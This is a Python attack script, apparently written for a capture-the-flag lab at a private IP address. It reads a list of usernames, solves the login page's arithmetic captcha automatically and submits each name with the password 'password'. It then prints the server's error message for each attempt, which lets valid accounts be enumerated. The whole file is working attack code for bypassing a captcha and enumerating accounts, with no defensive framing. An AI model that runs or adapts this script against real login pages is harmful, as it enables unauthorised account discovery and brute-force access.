import requests
import re

# Function to extract the captcha question and answer from the login page
def extract_captcha(html):
    captcha_regex = r'(\d+)\s*([\+\-\*])\s*(\d+)\s*=\s*\?'
    match = re.search(captcha_regex, html)
    if match:
        num1 = int(match.group(1))
        operator = match.group(2)
        num2 = int(match.group(3))
        if operator == '+':
            answer = num1 + num2
        elif operator == '-':
            answer = num1 - num2
        elif operator == '*':
            answer = num1 * num2
        return answer
    else:
        return None

# Read usernames from file
with open('usernames.txt', 'r') as file:
    usernames = [line.strip() for line in file]

# Try each username
for username in usernames:
    # Initialize a session for each request
    session = requests.Session()

    # First request to get captcha_answer from the login page
    try:
        response = session.get('http://10.10.220.214/login')
        response.raise_for_status()
        captcha_answer = extract_captcha(response.text)
        if captcha_answer is None:
            raise ValueError("Captcha not found")
    except requests.RequestException as e:
        print(f"Error in getting login page: {e}")
        continue
    except ValueError as e:
        print(f"Error in processing captcha: {e}")
        continue

    # Send login request with username, password, and captcha_answer
    data = {'username': username, 'password': 'password', 'captcha': captcha_answer}
    try:
        response = session.post('http://10.10.220.214/login', data=data)
        response.raise_for_status()
    except requests.RequestException as e:
        print(f"Error in sending login request: {e}")
        continue

    error_message_match = re.search(r'Error(.+)', response.text)
    if error_message_match:
        error_message = error_message_match.group(1)
    else:
        error_message = 'Error message not found'
    print(f"{username} - Error message: {error_message}")
